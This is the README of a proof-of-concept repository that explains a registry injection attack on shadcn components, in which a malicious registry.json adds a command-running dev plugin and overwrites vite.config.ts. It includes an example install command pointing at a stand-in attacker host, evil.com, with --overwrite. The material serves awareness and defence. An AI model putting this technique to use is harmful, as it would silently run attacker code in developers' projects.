# shadcn-registry-injection-demo

> **Proof of Concept:** Registry Injection Attack targeting the `shadcn` component ecosystem  
> **Educational Purpose Only**

---


[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/dteGNxAe5Vc/0.jpg)](https://www.youtube.com/watch?v=dteGNxAe5Vc)


## ⚠️ Disclaimer

This repository is created solely for educational and awareness purposes to demonstrate how a registry injection attack could compromise projects by injecting malicious code through dependencies and configuration files.  
**Do NOT use this code for any unauthorized, harmful, or illegal activities.**

---

## What is a Registry Injection Attack?

A Registry Injection Attack involves publishing or injecting malicious packages into public or private package registries to trick developers into installing compromised dependencies or components. Attackers exploit trust in package names, registries, or installation commands to gain unauthorized access, steal data, or execute malicious code silently.

---

## About This Demo and the shadcn Vulnerability

Shadcn registries let you install UI components quickly, but they can also include **dev dependencies**, **overwrite configuration files**, and **silently inject malicious code** into your project.

### How the Attack Works

- A `registry.json` file defines components, dependencies, and even files to overwrite.
- The attacker includes a malicious dev dependency, such as `vite-plugin-run`, which can execute arbitrary shell commands when your development server starts.
- The attacker overwrites critical config files like `vite.config.ts` to inject code that runs commands automatically — without any warning or prompt.
- For example, an attacker can run:

  ```bash
  npx shadcn@latest add https://evil.com/registry.json --overwrite
  ```
